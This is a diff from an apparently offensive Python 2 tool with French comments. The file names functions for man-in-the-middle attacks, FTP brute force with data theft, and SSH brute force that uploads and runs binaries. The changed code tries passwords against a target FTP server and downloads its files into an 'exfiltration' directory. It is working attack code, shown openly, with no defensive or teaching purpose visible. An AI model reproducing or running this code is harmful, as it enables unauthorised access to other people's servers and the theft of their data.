@@ -146,7 +146,7 @@ def mitm(): # fonction man in the middle
 #TODO brute force -> meilleure gestion des exceptions ; multithreading
 			
 def bruteFTP(ip): #bruteforce FTP + récuperation de données
-	storedir = "/exfiltration"
+	storedir = "/data/exfiltration"
 	ftp=FTP(ip)
 	for password in passwords:
 		try:
@@ -169,17 +169,25 @@ def bruteFTP(ip): #bruteforce FTP + récuperation de données
 		try:
 			currdir=os.getcwd()
 			for j in range(len(files)):
-				os.chdir(storedir)
+				print j
+				try:
+					os.chdir(storedir)
+				except:
+					print "chemin inconu"
 				print "telechargement de =>",files[j]
-				fhandle = open(files[j], 'wb')
-				ftp.retrbinary('RETR ' + files[j], fhandle.write)
-				fhandle.close()
+				if j >= 2:
+					fhandle = open(files[j], 'wb')
+					ftp.retrbinary('RETR ' + files[j], fhandle.write)
+					fhandle.close()
+				else:
+					continue
 			os.chdir(currdir)
 			ftp.quit()
 			break
 		except:
 			print "ereur de telechargement // commande RETR non présente sur le serveur ftp ?"
 			break
+
 
 def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
 	exec_dir = ""
